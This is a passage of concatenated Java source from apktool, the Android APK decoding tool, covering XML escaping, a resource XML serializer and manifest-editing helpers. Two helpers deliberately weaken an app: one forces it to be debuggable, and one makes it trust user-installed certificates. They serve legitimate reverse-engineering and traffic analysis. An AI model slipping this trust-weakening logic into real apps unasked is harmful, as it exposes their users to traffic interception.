        if (out.charAt(0) != '"' && isAmbiguousString(out, attrType)) {
            out.insert(0, '\\');
        }

        return out.toString();
    }

    private static void appendEscapedString(StringBuilder out, String str, int start, int end, int attrType,
                                            boolean styled) {
        int len = str.length();
        int offset = out.length();
        boolean quote = false;
        char ch = 0, prev = 0, prev2 = 0;
        for (int i = start; i < end; i++, prev2 = prev, prev = ch) {
            ch = str.charAt(i);
            if (ch == '\n') {
                if (attrType != 0) {
                    out.append("\\n");
                } else {
                    out.append(ch);
                    quote = true;
                }
                continue;
            } else if (ch == '\t') {
                out.append("\\t");
                continue;
            } else if (TextUtils.isPrintableChar(ch)) {
                if (ch == '\\') {
                    out.append('\\');
                    // fallthrough
                } else if (attrType == 0) {
                    // The following are used for values XMLs only. The serializer will handle attribute values.
                    if (ch == ' ') {
                        // Normal strings collapse whitespace and trim both ends, while styled strings only collapse
                        // whitespace.
                        if (prev == ' ' || (!styled && (i == 0 || i == len - 1))) {
                            quote = true;
                        }
                        // fallthrough
                    } else if (ch == '\'') {
                        quote = true;
                        // fallthrough
                    } else if (ch == '"') {
                        out.append('\\');
                        // fallthrough
                    } else if (ch == '&') {
                        out.append("&amp;");
                        continue;
                    } else if (ch == '<') {
                        out.append("&lt;");
                        continue;
                    } else if (ch == '>' && prev == ']' && prev2 == ']') {
                        out.append("&gt;");
                        continue;
                    }
                    // fallthrough
                }
                out.append(ch);
                continue;
            } else if (Character.isHighSurrogate(ch) && i < end - 1) {
                // Is this high surrogate followed by a valid low surrogate?
                char low = str.charAt(i + 1);
                if (Character.isLowSurrogate(low)) {
                    out.append(ch);
                    out.append(low);
                    i++;
                    continue;
                }
                // fallthrough
            }
            // Skip writing trailing \u0000 if we are at end of string.
            if (ch == 0 && i == len - 1) {
                break;
            }
            // Java-style Unicode escape the non-printable character.
            out.append(String.format("\\u%04x", (int) ch));
        }
        if (quote) {
            out.insert(offset, '"').append('"');
        }
    }

    private static boolean isAmbiguousString(CharSequence text, int attrType) {
        int len = text.length();
        char ch = text.charAt(0);

        // Check for a reference.
        // Note: We don't check attribute type here because a reference is valid for any type.
        if (ch == '@') {
            if (len == 5) {
                if (text.charAt(1) == 'n' && text.charAt(2) == 'u' && text.charAt(3) == 'l' && text.charAt(4) == 'l') {
                    return true;
                }
            } else if (len == 6) {
                if (text.charAt(1) == 'e' && text.charAt(2) == 'm' && text.charAt(3) == 'p' && text.charAt(4) == 't'
                        && text.charAt(5) == 'y') {
                    return true;
                }
            }
            for (int i = 1; i < len; i++) {
                if (text.charAt(i) == '/') {
                    return true;
                }
            }
            return false;
        }
        if (ch == '?') {
            return len > 1;
        }

        // The following can only be ambiguous in attribute values.
        // Note: We can't escape a boolean in attribute values since \t is a tab.
        if (attrType == 0) {
            return false;
        }

        // Check for a color.
        if (ch == '#') {
            if ((attrType & ResAttribute.ATTR_TYPE_COLOR) != 0) {
                try {
                    TextUtils.parseColor(text, 0, len);
                    return true;
                } catch (NumberFormatException ignored) {
                }
            }
            return false;
        }

        // Check for an integer.
        if ((attrType & ResAttribute.ATTR_TYPE_INTEGER) != 0) {
            try {
                TextUtils.parseInt(text, 0, len);
                return true;
            } catch (NumberFormatException ignored) {
            }
        }

        // Check for a float or a complex value.
        boolean checkFloat = (attrType & ResAttribute.ATTR_TYPE_FLOAT) != 0;
        boolean checkDimen = (attrType & ResAttribute.ATTR_TYPE_DIMENSION) != 0;
        boolean checkFraction = (attrType & ResAttribute.ATTR_TYPE_FRACTION) != 0;
        if (checkFloat || checkDimen || checkFraction) {
            int suffixLen = 0;
            if (checkDimen) {
                String suffix = TextUtils.matchSuffix(
                    text, "px", "dp", "dip", "sp", "pt", "in", "mm");
                if (suffix != null) {
                    suffixLen = suffix.length();
                }
            }
            if (checkFraction && suffixLen == 0) {
                String suffix = TextUtils.matchSuffix(text, "%", "%p");
                if (suffix != null) {
                    suffixLen = suffix.length();
                }
            }
            if ((checkFloat && suffixLen == 0) || suffixLen > 0) {
                try {
                    TextUtils.parseFloat(text, 0, len - suffixLen);
                    return true;
                } catch (NumberFormatException ignored) {
                }
            }
        }
        return false;
    }

    private static void appendTagAttributeValue(StringBuilder out, String str, int start, int end) {
        char ch = 0, prev = 0, prev2 = 0;
        for (int i = start; i < end; i++, prev2 = prev, prev = ch) {
            ch = str.charAt(i);
            if (ch == '\n') {
                out.append("&#xA;");
            } else if (ch == '\r') {
                out.append("&#xD;");
            } else if (ch == '\t') {
                out.append("&#x9;");
            } else if (ch == '"') {
                out.append("&quot;");
            } else if (ch == '&') {
                out.append("&amp;");
            } else if (ch == '<') {
                out.append("&lt;");
            } else if (ch == '>' && prev == ']' && prev2 == ']') {
                out.append("&gt;");
            } else {
                out.append(ch);
            }
        }
    }

    public static String normalizeFormatSpecifiers(String str) {
        int len = str.length();
        if (len == 0) {
            return str;
        }

        int[][] specs = findFormatSpecifiers(str);
        int[] sequential = specs[0];
        int[] positional = specs[1];
        if (sequential.length == 0 || sequential.length + positional.length < 2) {
            return str;
        }

        StringBuilder out = new StringBuilder(len + sequential.length * 2);
        int i = 0;
        int count = 0;
        for (int j : sequential) {
            out.append(str, i, ++j).append(++count).append('$');
            i = j;
        }

        out.append(str, i, len);
        return out.toString();
    }

    /**
     * Returns a pair of int arrays:
     * 1. Offsets of sequential format specifiers. (e.g. %s, %d, etc.)
     * 2. Offsets of positional format specifiers. (e.g. %1$s, %2$d, etc.)
     */
    public static int[][] findFormatSpecifiers(String str) {
        int[] sequential = new int[4];
        int sequentialCount = 0;
        int[] positional = new int[4];
        int positionalCount = 0;

        int len = str.length();
        int i, j = 0;
        while ((i = str.indexOf('%', j)) != -1) {
            j = i + 1;
            if (j == len) {
                if (sequentialCount == sequential.length) {
                    sequential = Arrays.copyOf(sequential, sequential.length + 4);
                }
                sequential[sequentialCount++] = i - 1;
                break;
            }

            char ch = str.charAt(j++);
            if (ch == '%') {
                continue;
            }
            if (ch >= '0' && ch <= '9' && j < len) {
                while ((ch = str.charAt(j++)) >= '0' && ch <= '9' && j < len);
                if (ch == '$') {
                    if (positionalCount == positional.length) {
                        positional = Arrays.copyOf(positional, positional.length + 4);
                    }
                    positional[positionalCount++] = i;
                    continue;
                }
            }

            if (sequentialCount == sequential.length) {
                sequential = Arrays.copyOf(sequential, sequential.length + 4);
            }
            sequential[sequentialCount++] = i;
        }

        if (sequentialCount < sequential.length) {
            sequential = Arrays.copyOf(sequential, sequentialCount);
        }
        if (positionalCount < positional.length) {
            positional = Arrays.copyOf(positional, positionalCount);
        }

        return new int[][] { sequential, positional };
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/xml/ResXmlSerializer.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.xml;

import brut.common.Log;
import brut.util.TextUtils;
import brut.xml.XmlUtils;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

public class ResXmlSerializer implements XmlSerializer {
    private static final String TAG = ResXmlSerializer.class.getName();
    private static final String NOT_SUPPORTED = "Method is not supported.";

    private static final int BUFFER_SIZE = 8192;

    private final boolean mAutoEscape;
    private final char[] mBuffer;
    private boolean[] mIndent;
    private String[] mElementStack;
    private int[] mNamespaceCounts;
    private String[] mNamespaceStack;

    private Writer mWriter;
    private int mDepth;
    private boolean mPending;
    private int mAutoNamespace;
    private int mBufferIndex;

    public ResXmlSerializer(boolean autoEscape) {
        mAutoEscape = autoEscape;
        mBuffer = new char[BUFFER_SIZE];
        mIndent = new boolean[4];
        mElementStack = new String[12];
        mNamespaceCounts = new int[6];
        mNamespaceStack = new String[12];
    }

    // XmlSerializer

    @Override
    public void setFeature(String name, boolean state) {
        throw new IllegalStateException(NOT_SUPPORTED);
    }

    @Override
    public boolean getFeature(String name) {
        return false;
    }

    @Override
    public void setProperty(String name, Object value) {
        throw new IllegalStateException(NOT_SUPPORTED);
    }

    @Override
    public Object getProperty(String name) {
        return null;
    }

    @Override
    public void setOutput(OutputStream os, String encoding) throws IOException {
        if (encoding != null && !encoding.equalsIgnoreCase(StandardCharsets.UTF_8.name())) {
            throw new UnsupportedOperationException();
        }
        setOutput(new OutputStreamWriter(os, StandardCharsets.UTF_8));
    }

    @Override
    public void setOutput(Writer writer) {
        mWriter = writer;
        mDepth = 0;
        mIndent[0] = true;
        mPending = false;
        mAutoNamespace = 0;
        mNamespaceCounts[0] = 3;
        mNamespaceCounts[1] = 3;
        mNamespaceStack[0] = "";
        mNamespaceStack[1] = "";
        mNamespaceStack[2] = XmlUtils.XML_PREFIX;
        mNamespaceStack[3] = XmlUtils.XML_URI;
        mNamespaceStack[4] = XmlUtils.XMLNS_PREFIX;
        mNamespaceStack[5] = XmlUtils.XMLNS_URI;
    }

    @Override
    public void startDocument(String encoding, Boolean standalone) throws IOException {
        write(XmlUtils.XML_PROLOG);
    }

    @Override
    public void endDocument() throws IOException {
        while (mDepth > 0) {
            endTag(mElementStack[mDepth * 3 - 3], mElementStack[mDepth * 3 - 1]);
        }
        write(System.lineSeparator());
        flush();
    }

    @Override
    public void setPrefix(String prefix, String namespace) throws IOException {
        check(false);
        if (prefix == null) {
            prefix = "";
        }
        if (namespace == null) {
            namespace = "";
        }

        // Ignore identical prefix definitions.
        if (prefix.equals(getPrefix(namespace, true, false))) {
            return;
        }

        int i = (mNamespaceCounts[mDepth + 1]++) << 1;
        if (mNamespaceStack.length < i + 1) {
            String[] newStack = new String[mNamespaceStack.length + 16];
            System.arraycopy(mNamespaceStack, 0, newStack, 0, i);
            mNamespaceStack = newStack;
        }

        mNamespaceStack[i++] = prefix;
        mNamespaceStack[i] = namespace;
    }

    @Override
    public String getPrefix(String namespace, boolean generatePrefix) {
        try {
            return getPrefix(namespace, false, generatePrefix);
        }
        catch (IOException ex) {
            throw new RuntimeException(ex);
        }
    }

    private String getPrefix(String namespace, boolean includeDefault, boolean generatePrefix) throws IOException {
        for (int i = mNamespaceCounts[mDepth + 1] * 2 - 2; i >= 0; i -= 2) {
            if (mNamespaceStack[i + 1].equals(namespace) && (includeDefault || !mNamespaceStack[i].isEmpty())) {
                String candidate = mNamespaceStack[i];
                for (int j = i + 2; j < mNamespaceCounts[mDepth + 1] * 2; j++) {
                    if (mNamespaceStack[j].equals(candidate)) {
                        candidate = null;
                        break;
                    }
                }
                if (candidate != null) {
                    return candidate;
                }
            }
        }

        if (!generatePrefix) {
            return null;
        }

        String prefix;
        if (namespace.isEmpty()) {
            prefix = "";
        } else {
            do {
                prefix = "n" + (mAutoNamespace++);
                for (int i = mNamespaceCounts[mDepth + 1] * 2 - 2; i >= 0; i -= 2) {
                    if (prefix.equals(mNamespaceStack[i])) {
                        prefix = null;
                        break;
                    }
                }
            }
            while (prefix == null);
        }

        boolean pending = mPending;
        mPending = false;
        setPrefix(prefix, namespace);
        mPending = pending;
        return prefix;
    }

    @Override
    public int getDepth() {
        return mPending ? mDepth + 1 : mDepth;
    }

    @Override
    public String getNamespace() {
        int depth = getDepth();
        return depth > 0 ? mElementStack[depth * 3 - 3] : null;
    }

    @Override
    public String getName() {
        int depth = getDepth();
        return depth > 0 ? mElementStack[depth * 3 - 1] : null;
    }

    @Override
    public XmlSerializer startTag(String namespace, String name) throws IOException {
        check(false);
        writeIndent();

        int i = mDepth * 3;
        if (mElementStack.length < i + 3) {
            String[] newStack = new String[mElementStack.length + 12];
            System.arraycopy(mElementStack, 0, newStack, 0, i);
            mElementStack = newStack;
        }

        String prefix = namespace != null ? getPrefix(namespace, true, true) : "";
        if (namespace != null && namespace.isEmpty()) {
            for (int j = mNamespaceCounts[mDepth]; j < mNamespaceCounts[mDepth + 1]; j++) {
                if (mNamespaceStack[j * 2].isEmpty() && !mNamespaceStack[j * 2 + 1].isEmpty()) {
                    throw new IllegalStateException("Could not set default namespace for elements in no namespace.");
                }
            }
        }

        mElementStack[i++] = namespace;
        mElementStack[i++] = prefix;
        mElementStack[i] = name;

        write('<');
        if (!prefix.isEmpty()) {
            write(prefix);
            write(':');
        }
        write(name);

        mIndent[mDepth] = true;
        mPending = true;
        return this;
    }

    @Override
    public XmlSerializer endTag(String namespace, String name) throws IOException {
        if (!mPending) {
            mDepth--;
        }
        if ((namespace == null && mElementStack[mDepth * 3] != null)
                || (namespace != null && !namespace.equals(mElementStack[mDepth * 3]))
                || !mElementStack[mDepth * 3 + 2].equals(name)) {
            throw new IllegalArgumentException("</{" + namespace + "}" + name + "> does not match start.");
        }

        if (mPending) {
            check(true);
            mDepth--;
        } else {
            if (mIndent[mDepth + 1]) {
                writeIndent();
            }
            write("</");
            String prefix = mElementStack[mDepth * 3 + 1];
            if (!prefix.isEmpty()) {
                write(prefix);
                write(':');
            }
            write(name);
            write('>');
        }

        mNamespaceCounts[mDepth + 1] = mNamespaceCounts[mDepth];
        return this;
    }

    @Override
    public XmlSerializer attribute(String namespace, String name, String value) throws IOException {
        if (!mPending) {
            throw new IllegalStateException("Illegal position for attribute.");
        }
        if (namespace == null) {
            namespace = "";
        }

        write(' ');
        String prefix = !namespace.isEmpty() ? getPrefix(namespace, false, true) : "";
        if (!prefix.isEmpty()) {
            write(prefix);
            write(':');
        }
        write(name);
        write("=\"");
        if (mAutoEscape) {
            writeEscaped(value, true);
        } else {
            write(value);
        }
        write('"');
        return this;
    }

    @Override
    public XmlSerializer text(String text) throws IOException {
        check(false);
        mIndent[mDepth] = false;
        if (mAutoEscape) {
            writeEscaped(text, false);
        } else {
            write(text);
        }
        return this;
    }

    @Override
    public XmlSerializer text(char[] buf, int start, int len) throws IOException {
        return text(new String(buf, start, len));
    }

    @Override
    public void cdsect(String text) {
        throw new IllegalStateException(NOT_SUPPORTED);
    }

    @Override
    public void entityRef(String text) {
        throw new IllegalStateException(NOT_SUPPORTED);
    }

    @Override
    public void processingInstruction(String text) {
        throw new IllegalStateException(NOT_SUPPORTED);
    }

    @Override
    public void comment(String text) {
        throw new IllegalStateException(NOT_SUPPORTED);
    }

    @Override
    public void docdecl(String text) {
        throw new IllegalStateException(NOT_SUPPORTED);
    }

    @Override
    public void ignorableWhitespace(String text) {
        throw new IllegalStateException(NOT_SUPPORTED);
    }

    @Override
    public void flush() throws IOException {
        check(false);
        flushBuffer();
    }

    // Utility methods

    private void check(boolean close) throws IOException {
        if (!mPending) {
            return;
        }
        if (mIndent[mDepth] && mNamespaceCounts[mDepth] < mNamespaceCounts[mDepth + 1]) {
            writeIndent();
            write(' ');
        }

        mPending = false;
        mDepth++;

        if (mIndent.length <= mDepth) {
            boolean[] newIndent = new boolean[mDepth + 4];
            System.arraycopy(mIndent, 0, newIndent, 0, mDepth);
            mIndent = newIndent;
        }
        mIndent[mDepth] = mIndent[mDepth - 1];

        for (int i = mNamespaceCounts[mDepth - 1]; i < mNamespaceCounts[mDepth]; i++) {
            String prefix = mNamespaceStack[i * 2];
            String uri = mNamespaceStack[i * 2 + 1];
            write(" xmlns");
            if (!prefix.isEmpty()) {
                write(':');
                write(prefix);
            } else if (getNamespace().isEmpty() && !uri.isEmpty()) {
                throw new IllegalStateException("Could not set default namespace for elements in no namespace.");
            }
            write("=\"");
            if (mAutoEscape) {
                writeEscaped(uri, true);
            } else {
                write(uri);
            }
            write('"');
        }

        if (mNamespaceCounts.length <= mDepth + 1) {
            int[] newCounts = new int[mDepth + 8];
            System.arraycopy(mNamespaceCounts, 0, newCounts, 0, mDepth + 1);
            mNamespaceCounts = newCounts;
        }

        mNamespaceCounts[mDepth + 1] = mNamespaceCounts[mDepth];

        if (close) {
            write(" />");
        } else {
            write('>');
        }
    }

    private void flushBuffer() throws IOException {
        if (mBufferIndex > 0) {
            mWriter.write(mBuffer, 0, mBufferIndex);
            mWriter.flush();
            mBufferIndex = 0;
        }
    }

    private void writeIndent() throws IOException {
        write(System.lineSeparator());
        int len = mDepth * 4;
        while (len > 0) {
            if (mBufferIndex == BUFFER_SIZE) {
                flushBuffer();
            }
            int batch = BUFFER_SIZE - mBufferIndex;
            if (batch > len) {
                batch = len;
            }
            Arrays.fill(mBuffer, mBufferIndex, mBufferIndex + batch, ' ');
            len -= batch;
            mBufferIndex += batch;
        }
    }

    private void write(char ch) throws IOException {
        if (mBufferIndex >= BUFFER_SIZE) {
            flushBuffer();
        }
        mBuffer[mBufferIndex++] = ch;
    }

    private void write(String str) throws IOException {
        write(str, 0, str.length());
    }

    private void write(String str, int start, int len) throws IOException {
        while (len > 0) {
            if (mBufferIndex == BUFFER_SIZE) {
                flushBuffer();
            }
            int batch = BUFFER_SIZE - mBufferIndex;
            if (batch > len) {
                batch = len;
            }
            str.getChars(start, start + batch, mBuffer, mBufferIndex);
            start += batch;
            len -= batch;
            mBufferIndex += batch;
        }
    }

    /**
     * Only used to safely serialize manifest and resource XMLs.
     * Must be disabled when serializing values XMLs.
     */
    private void writeEscaped(String str, boolean attr) throws IOException {
        char ch = 0, prev = 0, prev2 = 0;
        for (int i = 0, n = str.length(); i < n; i++, prev2 = prev, prev = ch) {
            ch = str.charAt(i);
            if (ch == '\n') {
                if (attr) {
                    write("&#xA;");
                    continue;
                }
                // fallthrough
            } else if (ch == '\r') {
                if (attr) {
                    write("&#xD;");
                    continue;
                }
                // fallthrough
            } else if (ch == '\t') {
                if (attr) {
                    write("&#x9;");
                    continue;
                }
                // fallthrough
            } else if (ch == '"') {
                if (attr) {
                    write("&quot;");
                    continue;
                }
                // fallthrough
            } else if (ch == '&') {
                write("&amp;");
                continue;
            } else if (ch == '<') {
                write("&lt;");
                continue;
            } else if (ch == '>') {
                if (prev == ']' && prev2 == ']') {
                    write("&gt;");
                    continue;
                }
                // fallthrough
            } else if (TextUtils.isPrintableChar(ch)) {
                // fallthrough
            } else if (Character.isHighSurrogate(ch) && i < n - 1) {
                // Is this high surrogate followed by a valid low surrogate?
                char low = str.charAt(i + 1);
                if (Character.isLowSurrogate(low)) {
                    write(ch);
                    write(low);
                    i++;
                } else {
                    Log.w(TAG, "Bad surrogate pair (U+%04x U+%04x)", (int) ch, (int) low);
                }
                continue;
            } else {
                Log.w(TAG, "Illegal character (U+%04x)", (int) ch);
                continue;
            }
            write(ch);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/xml/ResXmlUtils.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.xml;

import brut.xml.XmlUtils;
import org.w3c.dom.*;
import org.xml.sax.SAXException;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.TransformerException;
import javax.xml.xpath.XPathExpressionException;
import java.io.*;
import java.util.*;

public final class ResXmlUtils {
    public static final String ANDROID_RES_NS = "http://schemas.android.com/apk/res/android";
    public static final String ANDROID_RES_NS_AUTO = "http://schemas.android.com/apk/res-auto";

    private ResXmlUtils() {
        // Private constructor for utility class.
    }

    /**
     * Sets "debuggable" attribute to true for application.
     *
     * @param file File for AndroidManifest.xml
     */
    public static void setApplicationDebugTagTrue(File file) {
        try {
            Document doc = XmlUtils.loadDocument(file);
            Node application = doc.getElementsByTagName("application").item(0);
            NamedNodeMap attrs = application.getAttributes();
            boolean changed = false;

            Node debugAttr = attrs.getNamedItem("android:debuggable");
            if (debugAttr == null) {
                debugAttr = doc.createAttribute("android:debuggable");
                debugAttr.setNodeValue("true");
                attrs.setNamedItem(debugAttr);
                changed = true;
            } else if (!debugAttr.getNodeValue().equals("true")) {
                debugAttr.setNodeValue("true");
                changed = true;
            }

            if (changed) {
                XmlUtils.saveDocument(doc, file);
            }
        } catch (IOException | SAXException | ParserConfigurationException | TransformerException ignored) {
        }
    }

    /**
     * Sets the network security config attribute for application.
     *
     * @param file File for AndroidManifest.xml
     */
    public static void setNetworkSecurityConfig(File file) {
        try {
            Document doc = XmlUtils.loadDocument(file);
            Node application = doc.getElementsByTagName("application").item(0);
            NamedNodeMap attrs = application.getAttributes();
            boolean changed = false;

            Node netSecConfAttr = attrs.getNamedItem("android:networkSecurityConfig");
            if (netSecConfAttr == null) {
                netSecConfAttr = doc.createAttribute("android:networkSecurityConfig");
                netSecConfAttr.setNodeValue("@xml/network_security_config");
                attrs.setNamedItem(netSecConfAttr);
                changed = true;
            } else if (!netSecConfAttr.getNodeValue().equals("@xml/network_security_config")) {
                netSecConfAttr.setNodeValue("@xml/network_security_config");
                changed = true;
            }

            if (changed) {
                XmlUtils.saveDocument(doc, file);
            }
        } catch (IOException | SAXException | ParserConfigurationException | TransformerException ignored) {
        }
    }

    /**
     * Modifies a network security config to be more permissive.
     *
     * @param file Network security config file
     */
    public static void modNetworkSecurityConfig(File file) {
        try {
            Document doc;
            if (file.exists()) {
                doc = XmlUtils.loadDocument(file);
                doc.getDocumentElement().normalize();
            } else {
                doc = XmlUtils.newDocument();
            }
            boolean changed = false;

            Element root = (Element) doc.getElementsByTagName("network-security-config").item(0);
            if (root == null) {
                root = doc.createElement("network-security-config");
                doc.appendChild(root);
                changed = true;
            }

            Element baseConfig = (Element) root.getElementsByTagName("base-config").item(0);
            if (baseConfig == null) {
                baseConfig = doc.createElement("base-config");
                root.appendChild(baseConfig);
                changed = true;
            }

            Element trustAnchors = (Element) baseConfig.getElementsByTagName("trust-anchors").item(0);
            if (trustAnchors == null) {
                trustAnchors = doc.createElement("trust-anchors");
                baseConfig.appendChild(trustAnchors);
                changed = true;
            }

            NodeList certificates = trustAnchors.getElementsByTagName("certificates");
            boolean hasSystemCert = false;
            boolean hasUserCert = false;
            for (int i = 0; i < certificates.getLength(); i++) {
                Element cert = (Element) certificates.item(i);
                String src = cert.getAttribute("src");
                if (src.equals("system")) {
                    hasSystemCert = true;
                } else if (src.equals("user")) {
                    hasUserCert = true;
                }
            }

            if (!hasSystemCert) {
                Element certSystem = doc.createElement("certificates");
                certSystem.setAttribute("src", "system");
                trustAnchors.appendChild(certSystem);
                changed = true;
            }

            if (!hasUserCert) {
                Element certUser = doc.createElement("certificates");
                certUser.setAttribute("src", "user");
                trustAnchors.appendChild(certUser);
                changed = true;
            }

            if (changed) {
                XmlUtils.saveDocument(doc, file);
            }
        } catch (IOException | SAXException | ParserConfigurationException | TransformerException ignored) {
        }
    }

    /**
     * Removes attributes like "versionCode" and "versionName" from file.
     *
     * @param file File for AndroidManifest.xml
     */
    public static void removeManifestVersions(File file) {
        try {
            Document doc = XmlUtils.loadDocument(file);
            Node manifest = doc.getFirstChild();
            NamedNodeMap attrs = manifest.getAttributes();
            boolean changed = false;

            Node versionCodeAttr = attrs.getNamedItem("android:versionCode");
            if (versionCodeAttr != null) {
                attrs.removeNamedItem("android:versionCode");
                changed = true;
            }

            Node versionNameAttr = attrs.getNamedItem("android:versionName");
            if (versionNameAttr != null) {
                attrs.removeNamedItem("android:versionName");
                changed = true;
            }

            if (changed) {
                XmlUtils.saveDocument(doc, file);
            }
        } catch (IOException | SAXException | ParserConfigurationException | TransformerException ignored) {
        }
    }

    /**
     * Finds all feature flags set on permissions in AndroidManifest.xml.
     *
     * @param file File for AndroidManifest.xml
     * @return String[]|null
     */
    public static String[] pullManifestFeatureFlags(File file) {
        try {
            Document doc = XmlUtils.loadDocument(file, true);
            String expression = "/manifest//@android:featureFlag";
            NodeList nodes = XmlUtils.evaluateXPath(doc, expression, NodeList.class);

            String[] featureFlags = new String[nodes.getLength()];

            for (int i = 0; i < featureFlags.length; i++) {
                featureFlags[i] = nodes.item(i).getNodeValue();
            }

            return featureFlags;
        } catch (IOException | SAXException | ParserConfigurationException | XPathExpressionException ignored) {
            return null;
        }
    }

    /**
     * Any @string reference in a provider value in AndroidManifest.xml will break on
     * build, thus preventing the application from installing. This is from a bug/error
     * in AOSP where public resources cannot be part of an authorities attribute within
     * a provider tag.
     * <p>
     * This finds any reference and replaces it with the literal value found in the
     * res/values/strings.xml file.
     *
     * @param file File for AndroidManifest.xml
     */
    public static void fixingPublicAttrsInProviderAttributes(File file) {
        try {
            Document doc = XmlUtils.loadDocument(file, true);
            boolean changed = false;

            String expression = "/manifest/application/provider/@android:authorities";
            NodeList nodes = XmlUtils.evaluateXPath(doc, expression, NodeList.class);

            for (int i = 0; i < nodes.getLength(); i++) {
                if (replaceStringReference(file, nodes.item(i))) {
                    changed = true;
                }
            }

            expression = "/manifest/application/activity/intent-filter/data/@android:scheme";
            nodes = XmlUtils.evaluateXPath(doc, expression, NodeList.class);

            for (int i = 0; i < nodes.getLength(); i++) {
                if (replaceStringReference(file, nodes.item(i))) {
                    changed = true;
                }
            }

            if (changed) {
                XmlUtils.saveDocument(doc, file);
            }
        } catch (IOException | SAXException | ParserConfigurationException | XPathExpressionException
                | TransformerException ignored) {
        }
    }

    /**
     * Replaces a string reference in a node with the referenced string.
     * Returns true if the replacement was properly made to a node, false otherwise.
     *
     * @param file File we are searching for value
     * @param node Node with a string reference
     * @return boolean
     */
    private static boolean replaceStringReference(File file, Node node) {
        String replacement = pullValueFromStrings(file.getParentFile(), node.getNodeValue());
        if (replacement == null) {
            return false;
        }

        node.setNodeValue(replacement);
        return true;
    }

    /**
     * Finds key in strings.xml file and returns text value.
     *
     * @param apkDir Root directory of apk
     * @param key String reference (ie @string/foo)
     * @return String|null
     */
    public static String pullValueFromStrings(File apkDir, String key) {
        return pullValueFromXml(new File(apkDir, "res/values/strings.xml"), "string", key);
    }

    /**
     * Finds key in integers.xml file and returns text value.
     *
     * @param apkDir Root directory of apk
     * @param key Integer reference (ie @integer/foo)
     * @return String|null
     */
    public static String pullValueFromIntegers(File apkDir, String key) {
        return pullValueFromXml(new File(apkDir, "res/values/integers.xml"), "integer", key);
    }

    /**
     * Finds key in a values XML file and returns text value.
     *
     * @param file File to pull the value from
     * @param type Resource type
     * @param key Resource reference
     * @return String|null
     */
    private static String pullValueFromXml(File file, String type, String key) {
        if (!file.isFile() || key == null || key.indexOf('@') == -1) {
            return null;
        }

        key = key.replace("@" + type + "/", "");
        try {
            Document doc = XmlUtils.loadDocument(file);
            String expression = String.format("/resources/%s[@name='%s']/text()", type, key);

            return XmlUtils.evaluateXPath(doc, expression, String.class);
        } catch (IOException | SAXException | ParserConfigurationException | XPathExpressionException ignored) {
            return null;
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/xml/ValuesXmlSerializable.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.xml;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.res.table.ResEntry;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;

public interface ValuesXmlSerializable {
    void serializeToValuesXml(XmlSerializer serial, ResEntry entry) throws AndrolibException, IOException;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/smali/SmaliBuilder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.smali;

import brut.androlib.exceptions.AndrolibException;
import brut.directory.DirectoryException;
import brut.directory.FileDirectory;
import brut.common.Log;
import brut.util.OS;
import com.android.tools.smali.dexlib2.Opcodes;
import com.android.tools.smali.dexlib2.writer.builder.DexBuilder;
import com.android.tools.smali.dexlib2.writer.io.FileDataStore;
import com.android.tools.smali.smali.smaliFlexLexer;
import com.android.tools.smali.smali.smaliParser;
import com.android.tools.smali.smali.smaliTreeWalker;
import org.antlr.runtime.CommonTokenStream;
import org.antlr.runtime.RecognitionException;
import org.antlr.runtime.Token;
import org.antlr.runtime.tree.CommonTree;
import org.antlr.runtime.tree.CommonTreeNodeStream;

import java.io.File;
import java.io.InputStreamReader;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

public class SmaliBuilder {
